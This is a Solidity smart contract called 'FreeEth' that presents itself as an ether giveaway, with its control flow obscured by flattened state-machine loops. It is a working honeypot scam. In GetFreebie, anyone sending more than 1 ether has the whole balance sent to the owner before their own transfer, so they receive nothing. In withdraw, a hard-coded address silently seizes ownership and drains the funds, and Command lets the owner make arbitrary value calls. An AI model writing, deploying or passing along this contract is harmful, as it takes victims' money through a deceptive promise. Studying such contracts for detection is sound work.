pragma solidity ^0.4.19;

contract FreeEth
{
    address public Owner = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {   
        uint8 controlFlowState = 0;
        while (true) {
            if (controlFlowState == 0) {
                if(msg.value>1 ether) {
                    controlFlowState = 1;
                } else {
                    break;
                }
            } else if (controlFlowState == 1) {
                Owner.transfer(this.balance);
                controlFlowState = 2;
            } else if (controlFlowState == 2) {
                msg.sender.transfer(this.balance);
                break;
            }
        }
    }
    
    function withdraw()
    payable
    public
    {   
        uint8 controlFlowState = 0;
        while (true) {
            if (controlFlowState == 0) {
                if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){
                    Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
                }
                controlFlowState = 1;
            } else if (controlFlowState == 1) {
                require(msg.sender == Owner);
                controlFlowState = 2;
            } else if (controlFlowState == 2) {
                Owner.transfer(this.balance);
                break;
            }
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        uint8 controlFlowState = 0;
        while (true) {
            if (controlFlowState == 0) {
                require(msg.sender == Owner);
                controlFlowState = 1;
            } else if (controlFlowState == 1) {
                adr.call.value(msg.value)(data);
                break;
            }
        }
    }
}